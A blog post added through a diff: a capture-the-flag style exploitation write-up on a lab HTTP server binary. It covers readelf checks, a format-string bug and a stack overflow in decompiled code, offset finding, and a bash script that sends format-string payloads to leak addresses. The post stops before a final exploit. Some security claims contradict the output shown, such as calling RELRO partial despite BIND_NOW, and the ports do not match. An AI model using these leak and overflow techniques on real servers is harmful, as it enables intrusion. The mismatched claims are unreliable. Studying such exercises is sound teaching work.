@@ -1,4 +1,641 @@
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ 17/03/2015
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+return to sender - a little binary exploitation
+
+for the following i am mainly using ida, gdb and curl
+(edit: you can also use ghidra now # apt install snapd && snap install ghidra && nap run ghidra).
+
+
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+$readelf -l ./my_file
+Elf file type is DYN (Position-Independent Executable file)
+Entry point 0x1340
+There are 13 program headers, starting at offset 64
+
+Program Headers:
+  Type           Offset             VirtAddr           PhysAddr
+                 FileSiz            MemSiz              Flags  Align
+  PHDR           0x0000000000000040 0x0000000000000040 0x0000000000000040
+                 0x00000000000002d8 0x00000000000002d8  R      0x8
+  INTERP         0x0000000000000318 0x0000000000000318 0x0000000000000318
+                 0x000000000000001c 0x000000000000001c  R      0x1
+      [Requesting program interpreter: /lib64/ld-linux-x86-64.so.2]
+  LOAD           0x0000000000000000 0x0000000000000000 0x0000000000000000
+                 0x0000000000000b48 0x0000000000000b48  R      0x1000
+  LOAD           0x0000000000001000 0x0000000000001000 0x0000000000001000
+                 0x0000000000000981 0x0000000000000981  R E    0x1000
+  LOAD           0x0000000000002000 0x0000000000002000 0x0000000000002000
+                 0x00000000000002c4 0x00000000000002c4  R      0x1000
+  LOAD           0x0000000000002d00 0x0000000000003d00 0x0000000000003d00
+                 0x0000000000000310 0x0000000000000318  RW     0x1000
+  DYNAMIC        0x0000000000002d10 0x0000000000003d10 0x0000000000003d10
+                 0x00000000000001f0 0x00000000000001f0  RW     0x8
+  NOTE           0x0000000000000338 0x0000000000000338 0x0000000000000338
+                 0x0000000000000030 0x0000000000000030  R      0x8
+  NOTE           0x0000000000000368 0x0000000000000368 0x0000000000000368
+                 0x0000000000000044 0x0000000000000044  R      0x4
+  GNU_PROPERTY   0x0000000000000338 0x0000000000000338 0x0000000000000338
+                 0x0000000000000030 0x0000000000000030  R      0x8
+  GNU_EH_FRAME   0x0000000000002118 0x0000000000002118 0x0000000000002118
+                 0x000000000000005c 0x000000000000005c  R      0x4
+  GNU_STACK      0x0000000000000000 0x0000000000000000 0x0000000000000000
+                 0x0000000000000000 0x0000000000000000  RW     0x10
+  GNU_RELRO      0x0000000000002d00 0x0000000000003d00 0x0000000000003d00
+                 0x0000000000000300 0x0000000000000300  R      0x1
+
+ Section to Segment mapping:
+  Segment Sections...
+   00
+   01     .interp
+   02     .interp .note.gnu.property .note.gnu.build-id .note.ABI-tag .gnu.hash .dynsym .dynstr .gnu.version .gnu.version_r .rela.dyn .rela.plt
+   03     .init .plt .plt.got .plt.sec .text .fini
+   04     .rodata .eh_frame_hdr .eh_frame
+   05     .init_array .fini_array .dynamic .got .data .bss
+   06     .dynamic
+   07     .note.gnu.property
+   08     .note.gnu.build-id .note.ABI-tag
+   09     .note.gnu.property
+   10     .eh_frame_hdr
+   11
+   12     .init_array .fini_array .dynamic .got
+
+
+$readelf -d ./slowserver
+
+Dynamic section at offset 0x2d10 contains 27 entries:
+  Tag        Type                         Name/Value
+ 0x0000000000000001 (NEEDED)             Shared library: [libc.so.6]
+ 0x000000000000000c (INIT)               0x1000
+ 0x000000000000000d (FINI)               0x1974
+ 0x0000000000000019 (INIT_ARRAY)         0x3d00
+ 0x000000000000001b (INIT_ARRAYSZ)       8 (bytes)
+ 0x000000000000001a (FINI_ARRAY)         0x3d08
+ 0x000000000000001c (FINI_ARRAYSZ)       8 (bytes)
+ 0x000000006ffffef5 (GNU_HASH)           0x3b0
+ 0x0000000000000005 (STRTAB)             0x6a8
+ 0x0000000000000006 (SYMTAB)             0x3d8
+ 0x000000000000000a (STRSZ)              287 (bytes)
+ 0x000000000000000b (SYMENT)             24 (bytes)
+ 0x0000000000000015 (DEBUG)              0x0
+ 0x0000000000000003 (PLTGOT)             0x3f00
+ 0x0000000000000002 (PLTRELSZ)           576 (bytes)
+ 0x0000000000000014 (PLTREL)             RELA
+ 0x0000000000000017 (JMPREL)             0x908
+ 0x0000000000000007 (RELA)               0x848
+ 0x0000000000000008 (RELASZ)             192 (bytes)
+ 0x0000000000000009 (RELAENT)            24 (bytes)
+ 0x000000000000001e (FLAGS)              BIND_NOW
+ 0x000000006ffffffb (FLAGS_1)            Flags: NOW PIE
+ 0x000000006ffffffe (VERNEED)            0x808
+ 0x000000006fffffff (VERNEEDNUM)         1
+ 0x000000006ffffff0 (VERSYM)             0x7c8
+ 0x000000006ffffff9 (RELACOUNT)          3
+ 0x0000000000000000 (NULL)               0x0
+
+
+
+$readelf -h ./my_file
+ELF Header:
+  Magic:   7f 45 4c 46 02 01 01 00 00 00 00 00 00 00 00 00
+  Class:                             ELF64
+  Data:                              2's complement, little endian
+  Version:                           1 (current)
+  OS/ABI:                            UNIX - System V
+  ABI Version:                       0
+  Type:                              DYN (Position-Independent Executable file)
+  Machine:                           Advanced Micro Devices X86-64
+  Version:                           0x1
+  Entry point address:               0x1340
+  Start of program headers:          64 (bytes into file)
+  Start of section headers:          15120 (bytes into file)
+  Flags:                             0x0
+  Size of this header:               64 (bytes)
+  Size of program headers:           56 (bytes)
+  Number of program headers:         13
+  Size of section headers:           64 (bytes)
+  Number of section headers:         31
+  Section header string table index: 30
+
+$readelf -s ./my_file
+# nm ./my_file
+
+Symbol table '.dynsym' contains 30 entries:
+   Num:    Value          Size Type    Bind   Vis      Ndx Name
+     0: 0000000000000000     0 NOTYPE  LOCAL  DEFAULT  UND
+     1: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND free@GLIBC_2.2.5 (2)
+     2: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND _[...]@GLIBC_2.34 (3)
+     3: 0000000000000000     0 NOTYPE  WEAK   DEFAULT  UND _ITM_deregisterT[...]
+     4: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND fread@GLIBC_2.2.5 (2)
+     5: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND write@GLIBC_2.2.5 (2)
+     6: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND [...]@GLIBC_2.2.5 (2)
+     7: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND [...]@GLIBC_2.2.5 (2)
+     8: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND htons@GLIBC_2.2.5 (2)
+     9: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND [...]@GLIBC_2.2.5 (2)
+    10: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND [...]@GLIBC_2.2.5 (2)
+    11: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND [...]@GLIBC_2.2.5 (2)
+    12: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND close@GLIBC_2.2.5 (2)
+    13: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND read@GLIBC_2.2.5 (2)
+    14: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND [...]@GLIBC_2.2.5 (2)
+    15: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND ftell@GLIBC_2.2.5 (2)
+    16: 0000000000000000     0 NOTYPE  WEAK   DEFAULT  UND __gmon_start__
+    17: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND memcpy@GLIBC_2.14 (4)
+    18: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND [...]@GLIBC_2.2.5 (2)
+    19: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND [...]@GLIBC_2.2.5 (2)
+    20: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND fseek@GLIBC_2.2.5 (2)
+    21: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND bind@GLIBC_2.2.5 (2)
+    22: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND fopen@GLIBC_2.2.5 (2)
+    23: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND [...]@GLIBC_2.2.5 (2)
+    24: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND [...]@GLIBC_2.2.5 (2)
+    25: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND [...]@GLIBC_2.2.5 (2)
+    26: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND [...]@GLIBC_2.2.5 (2)
+    27: 0000000000000000     0 NOTYPE  WEAK   DEFAULT  UND _ITM_registerTMC[...]
+    28: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND [...]@GLIBC_2.2.5 (2)
+    29: 0000000000000000     0 FUNC    WEAK   DEFAULT  UND [...]@GLIBC_2.2.5 (2)
+
+Symbol table '.symtab' contains 64 entries:
+   Num:    Value          Size Type    Bind   Vis      Ndx Name
+     0: 0000000000000000     0 NOTYPE  LOCAL  DEFAULT  UND
+     1: 0000000000000000     0 FILE    LOCAL  DEFAULT  ABS Scrt1.o
+     2: 000000000000038c    32 OBJECT  LOCAL  DEFAULT    4 __abi_tag
+     3: 0000000000000000     0 FILE    LOCAL  DEFAULT  ABS crtstuff.c
+     4: 0000000000001370     0 FUNC    LOCAL  DEFAULT   16 deregister_tm_clones
+     5: 00000000000013a0     0 FUNC    LOCAL  DEFAULT   16 register_tm_clones
+     6: 00000000000013e0     0 FUNC    LOCAL  DEFAULT   16 __do_global_dtors_aux
+     7: 0000000000004010     1 OBJECT  LOCAL  DEFAULT   26 completed.0
+     8: 0000000000003d08     0 OBJECT  LOCAL  DEFAULT   22 __do_global_dtor[...]
+     9: 0000000000001420     0 FUNC    LOCAL  DEFAULT   16 frame_dummy
+    10: 0000000000003d00     0 OBJECT  LOCAL  DEFAULT   21 __frame_dummy_in[...]
+    11: 0000000000000000     0 FILE    LOCAL  DEFAULT  ABS webserver.c
+    12: 0000000000000000     0 FILE    LOCAL  DEFAULT  ABS crtstuff.c
+    13: 00000000000022c0     0 OBJECT  LOCAL  DEFAULT   20 __FRAME_END__
+    14: 0000000000000000     0 FILE    LOCAL  DEFAULT  ABS
+    15: 0000000000003d10     0 OBJECT  LOCAL  DEFAULT   23 _DYNAMIC
+    16: 0000000000002118     0 NOTYPE  LOCAL  DEFAULT   19 __GNU_EH_FRAME_HDR
+    17: 0000000000003f00     0 OBJECT  LOCAL  DEFAULT   24 _GLOBAL_OFFSET_TABLE_
+    18: 000000000000163e   149 FUNC    GLOBAL DEFAULT   16 handle_debug_request
+    19: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND free@GLIBC_2.2.5
+    20: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND __libc_start_mai[...]
+    21: 0000000000001803    27 FUNC    GLOBAL DEFAULT   16 __security_Check
+    22: 0000000000000000     0 NOTYPE  WEAK   DEFAULT  UND _ITM_deregisterT[...]
+    23: 0000000000004000     0 NOTYPE  WEAK   DEFAULT   25 data_start
+    24: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND fread@GLIBC_2.2.5
+    25: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND write@GLIBC_2.2.5
+    26: 0000000000004010     0 NOTYPE  GLOBAL DEFAULT   25 _edata
+    27: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND fclose@GLIBC_2.2.5
+    28: 0000000000001974     0 FUNC    GLOBAL HIDDEN    17 _fini
+    29: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND strlen@GLIBC_2.2.5
+    30: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND htons@GLIBC_2.2.5
+    31: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND printf@GLIBC_2.2.5
+    32: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND rewind@GLIBC_2.2.5
+    33: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND snprintf@GLIBC_2.2.5
+    34: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND close@GLIBC_2.2.5
+    35: 000000000000154e   240 FUNC    GLOBAL DEFAULT   16 handle_post_request
+    36: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND read@GLIBC_2.2.5
+    37: 0000000000004000     0 NOTYPE  GLOBAL DEFAULT   25 __data_start
+    38: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND strcmp@GLIBC_2.2.5
+    39: 00000000000016d3   304 FUNC    GLOBAL DEFAULT   16 handle_request
+    40: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND ftell@GLIBC_2.2.5
+    41: 0000000000000000     0 NOTYPE  WEAK   DEFAULT  UND __gmon_start__
+    42: 0000000000004008     0 OBJECT  GLOBAL HIDDEN    25 __dso_handle
+    43: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND memcpy@GLIBC_2.14
+    44: 0000000000002000     4 OBJECT  GLOBAL DEFAULT   18 _IO_stdin_used
+    45: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND malloc@GLIBC_2.2.5
+    46: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND listen@GLIBC_2.2.5
+    47: 0000000000004018     0 NOTYPE  GLOBAL DEFAULT   26 _end
+    48: 0000000000001340    38 FUNC    GLOBAL DEFAULT   16 _start
+    49: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND fseek@GLIBC_2.2.5
+    50: 0000000000004010     0 NOTYPE  GLOBAL DEFAULT   26 __bss_start
+    51: 000000000000181e   340 FUNC    GLOBAL DEFAULT   16 main
+    52: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND bind@GLIBC_2.2.5
+    53: 0000000000001429   293 FUNC    GLOBAL DEFAULT   16 handle_get_request
+    54: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND fopen@GLIBC_2.2.5
+    55: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND perror@GLIBC_2.2.5
+    56: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND strtok@GLIBC_2.2.5
+    57: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND accept@GLIBC_2.2.5
+    58: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND sprintf@GLIBC_2.2.5
+    59: 0000000000004010     0 OBJECT  GLOBAL HIDDEN    25 __TMC_END__
+    60: 0000000000000000     0 NOTYPE  WEAK   DEFAULT  UND _ITM_registerTMC[...]
+    61: 0000000000000000     0 FUNC    WEAK   DEFAULT  UND __cxa_finalize@G[...]
+    62: 0000000000001000     0 FUNC    GLOBAL HIDDEN    12 _init
+    63: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND socket@GLIBC_2.2.5
+
+
+
+
+soooooo
+
+-NX                     (GNU_STACK RW)
+-partial RELRO          (GNU_RELRO R, no BIND_NOW in elf -d)
+-PIE                    (Position-Independent Executable file)
+-no canaries            (no stack_chk or __stack_chk_fail)
+-no fortify             (no _chk)
+
+
+
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+ANALYSING DECOMPILATION // Decompiled soruce code again, with some comments
+
+starting at main, the annotated code looks like this:
+
+int main(void)
+{
+    int connection;
+
+    // Buffer for incoming HTTP request data
+    char buffer[1023];
+
+    // Used to null-terminate the received request
+    char null_byte;
+
+    // Size of sockaddr struct
+    socklen_t socket_length;
+
+    // Client socket address info
+    struct sockaddr client_addr;
+
+    // Server socket address info
+    struct sockaddr server_addr;
+
+    // File descriptor for accepted client connection
+    int client_socket;
+
+    // Main server socket
+    int server_socket;
+
+    // Create TCP socket
+    // AF_INET = IPv4
+    // SOCK_STREAM = TCP
+    server_socket = socket(AF_INET, SOCK_STREAM, 0);
+
+    if (server_socket == -1) {
+        perror("Socket creation failed");
+    }
+    else {
+
+        // Configure server address
+        server_addr.sa_family = AF_INET;
+
+        // htons converts host byte order -> network byte order
+        // 0x15b3 = 5555
+        server_addr.sa_data._0_2_ = htons(5555);
+
+        // Bind to 0.0.0.0 (all interfaces)
+        server_addr.sa_data[2] = '\0';
+        server_addr.sa_data[3] = '\0';
+        server_addr.sa_data[4] = '\0';
+        server_addr.sa_data[5] = '\0';
+
+        // Bind socket to port 5555
+        connection = bind(server_socket, &server_addr, 0x10);
+
+        if (connection == -1) {
+            perror("Bind failed");
+        }
+        else {
+
+            // Start listening for incoming connections
+            // backlog = 10 pending connections
+            connection = listen(server_socket, 10);
+
+            if (connection == -1) {
+                perror("Listen failed");
+            }
+            else {
+
+                printf("Server running on http://localhost:%d\n", 1234);
+
+                // Main server loop
+                while (true) {
+
+                    socket_length = 0x10;
+
+                    // Accept incoming client connection
+                    client_socket =
+                        accept(server_socket,
+                               &client_addr,
+                               &socket_length);
+
+                    if (client_socket == -1)
+                        break;
+
+                    // Null-terminate of the buffer is missing
+                    // Read request data from client
+                    read(client_socket, buffer, 0x3ff);
+
+                    // Null terminate request string
+                    null_byte = 0;
+
+                    // Process HTTP request
+                    handle_request(client_socket, buffer);
+
+                    // Close client connection
+                    close(client_socket);
+                }
+
+                perror("Accept failed");
+            }
+        }
+    }
+
+    return 1;
+}
+
+we check the handle_request:
+
+void handle_request(int client_socket, char *request_buffer)
+{
+    int result;
+
+    // HTTP method (GET, POST, etc.)
+    char *method;
+
+    // Requested path (/index.html, /api, etc.)
+    char *path;
+
+    // Buffer for POST body
+    void *post_data;
+
+    /*
+        strtok splits the request string into tokens.
+
+        Example HTTP request:
+
+        "GET /index HTTP/1.1"
+
+        Tokens become:
+            method  = "GET"
+            path    = "/index"
+            version = "HTTP/1.1"
+    */
+
+    // First token = HTTP method
+    method = strtok(request_buffer, " \t\r\n");
+
+    // Second token = path/URL
+    path = strtok(NULL, " \t\r\n");
+
+    // Third token = HTTP version
+    strtok(NULL, " \t\r\n");
+
+    // Check if request method is GET
+    result = strcmp(method, "GET");
+
+    if (result == 0) {
+
+        // Handle GET request
+        handle_get_request(client_socket);
+    }
+    else {
+
+        // Check if request method is DEBUG
+        result = strcmp(method, "DEBUG");
+
+        if (result == 0) {
+
+            // Custom/non-standard HTTP method
+            handle_debug_request(client_socket, path);
+        }
+        else {
+
+            // Check if request method is POST
+            result = strcmp(method, "POST");
+
+            if (result == 0) {
+
+                // Allocate memory for POST body
+                post_data = malloc(0x400);
+
+                // Read POST data from socket
+                read(client_socket, post_data, 0x400);
+
+                // Null terminate POST body
+                *(char *)((long)post_data + 0x400) = 0;
+
+                // Handle POST request
+                handle_post_request(client_socket, path);
+
+                // Free allocated memory
+                free(post_data);
+            }
+            else {
+
+                // Unknown HTTP method
+                printf("xyz");
+            }
+        }
+    }
+
+    return;
+}
+
+and the handle_debug_request method:
+
+void handle_debug_request(int client_socket, char *user_input)
+{
+    // Length of response
+    size_t length;
+
+    // Stack buffer
+    char buffer[42];
+
+    // Manual null terminator
+    char null_byte;
+
+    // Check if path/input exists
+    if (user_input == NULL) {
+
+        // Send error message to client
+        write(client_socket,
+              "Socket Connection Error",
+              0x16);
+    }
+    else {
+
+        /*
+            DANGEROUS:
+
+            user_input is used directly as format string.
+        */
+        sprintf(buffer, user_input);
+
+        // Null terminate buffer
+        null_byte = 0;
+
+        // Calculate output length
+        length = strlen(buffer);
+
+        // Send result back to client
+        write(client_socket, buffer, length);
+    }
+
+    return;
+}
+
+and finally
+
+void handle_post_request(uint64_t client_socket, void *post_data)
+{
+    // Small local stack buffer (16 bytes only)
+    char local_buffer[16];
+
+    /*
+        Copy 0x400 bytes (1024 bytes)
+        from post_data into local_buffer
+
+        HUGE overflow:
+        destination = 16 bytes
+        copied data = 1024 bytes
+    */
+    memcpy(local_buffer, post_data, 0x400);
+
+    return;
+}
+
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+FINDING THE OFFSET TO OVERWRITE THE FUNCTION POINTER
+
+because memcpy() copies 1024 bytes into a 16-byte stack buffer, the overwrite can extend beyond local_buffer and corrupt adjacent stack data.
+so when handle_post_request() returns, execution flow may jump to an attacker-controlled address instead of the legitimate caller.
+
+
+| higher addresses |
+-------------------
+| return address   |  <-- target
+| saved RBP        |
+| local_buffer[16] |
+-------------------
+| lower addresses  |
+
+
+it is very helpful, that stack canaries seem to be missing and we are using the usual calling convention.
+
+
+finding the offset by sending a broken post request to the server-binary. i use a little pattern here, which we then find again after
+the program received signal SIGSEGV, Segmentation fault.
+
+    printf 'POST /test HTTP/1.1\r\n\r\nAAAA..' | ncat 127.0.0.1 1234
+
+    or
+
+    telnet 127.0.0.1 1234
+    POST / HTTP/1.1\r\n\r\nAAAA..
+
+
+
+    (gdb)
+    ...
+    rbp            0x4141414141410a0d  0x4141414141410a0d
+
+
+we find the offset is 16 to overwrite rbp
+
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+"FUZZING" libc
+
+we have a position-independent executable (NX) and therefore need to check the address in memory first.
+here is a little script to get the libc addresses.
+
+
+cat fuzzy.sh
+#!/usr/bin/env bash
+
+HOST="127.0.0.1"
+PORT="1234"
+
+send() {
+    printf "%b" "$1" | ncat "$HOST" "$PORT"
+}
+
+extract() {
+    echo "$1" | grep -oE "0x[0-9a-fA-F]+|\(nil\)"
+}
+
+classify() {
+    echo "$1" | awk '
+    /0x7ff/ {print "[stack] " $0}
+    /0x7f/  {print "[libc ] " $0}
+    /0x55/  {print "[pie  ] " $0}
+    {print "[?]    " $0}
+    '
+}
+
+logfile="leaks.log"
+> "$logfile"
+
+echo "[*] Starting leak inspection..."
+
+for i in $(seq 1 3 180); do
+    payload=$(printf "DEBUG %%%d\$p.%%%d\$p.%%%d\$p\n" \
+        $i $((i+1)) $((i+2)))
+
+    resp=$(send "$payload")
+
+    leaks=$(extract "$resp")
+
+    echo "[$i] $payload"
+    classify "$leaks"
+
+    echo "[$i] $resp" >> "$logfile"
+    echo "-----------------------------"
+done
+
+echo "[*] Done. Saved raw output to $logfile"
+
+
+it outputs:
+...
+[136] DEBUG %136$p.%137$p.%138$p
+[pie  ] 0x55bd397a2780
+[?]    0x55bd397a2780
+[stack] 0x7fffd52a3550
+[libc ] 0x7fffd52a3550
+[?]    0x7fffd52a3550
+[?]    0x4d52a3650
+...
+
+
+so we get 0x55bd397a2780 which corresponds to the return adress of handle_post_request
+
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+CALCULATE the base adress
+
+cat /proc/$(pidof my_file)/maps
+55bd397a1000-55bd397a2000 r--p 00000000 00:1e 111868                     /home/user/Downloads/materials-trypwnmetwo/SlowServer/slowserver
+55bd397a2000-55bd397a3000 r-xp 00001000 00:1e 111868                     /home/user/Downloads/materials-trypwnmetwo/SlowServer/slowserver
+55bd397a3000-55bd397a4000 r--p 00002000 00:1e 111868                     /home/user/Downloads/materials-trypwnmetwo/SlowServer/slowserver
+55bd397a4000-55bd397a5000 r--p 00002000 00:1e 111868                     /home/user/Downloads/materials-trypwnmetwo/SlowServer/slowserver
+55bd397a5000-55bd397a6000 rw-p 00003000 00:1e 111868                     /home/user/Downloads/materials-trypwnmetwo/SlowServer/slowserver
+55bd68363000-55bd68384000 rw-p 00000000 00:00 0                          [heap]
+7f921b98f000-7f921b992000 rw-p 00000000 00:00 0
+7f921b992000-7f921b9ba000 r--p 00000000 00:1e 29800                      /usr/lib/x86_64-linux-gnu/libc.so.6
+7f921b9ba000-7f921bb1d000 r-xp 00028000 00:1e 29800                      /usr/lib/x86_64-linux-gnu/libc.so.6
+7f921bb1d000-7f921bb73000 r--p 0018b000 00:1e 29800                      /usr/lib/x86_64-linux-gnu/libc.so.6
+7f921bb73000-7f921bb77000 r--p 001e0000 00:1e 29800                      /usr/lib/x86_64-linux-gnu/libc.so.6
+7f921bb77000-7f921bb79000 rw-p 001e4000 00:1e 29800                      /usr/lib/x86_64-linux-gnu/libc.so.6
+7f921bb79000-7f921bb86000 rw-p 00000000 00:00 0
+7f921bb9f000-7f921bba1000 rw-p 00000000 00:00 0
+7f921bba1000-7f921bba5000 r--p 00000000 00:00 0                          [vvar]
+7f921bba5000-7f921bba7000 r-xp 00000000 00:00 0                          [vdso]
+7f921bba7000-7f921bba8000 r--p 00000000 00:1e 29794                      /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
+7f921bba8000-7f921bbd0000 r-xp 00001000 00:1e 29794                      /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
+7f921bbd0000-7f921bbdb000 r--p 00029000 00:1e 29794                      /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
+7f921bbdb000-7f921bbdd000 r--p 00034000 00:1e 29794                      /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
+7f921bbdd000-7f921bbde000 rw-p 00036000 00:1e 29794                      /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
+7f921bbde000-7f921bbdf000 rw-p 00000000 00:00 0
+7fffd5284000-7fffd52a5000 rw-p 00000000 00:00 0                          [stack]
+
+
+so the  base adress is 55bd397a1000 and we can calculate it using the the offset 0x1780
+0x55bd397a2780 - 0x1780  = 0x55bd397a1000
+
+
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+PUZZLE IT OUT
+
+
+
 ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ 19/07/2016
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
 happy doplhin!
 
@@ -31,6 +668,7 @@ $ qemu-i386 ./dolphim32
 
 
 ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ 03/12/2023
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
  hello world
  welcome to my blob
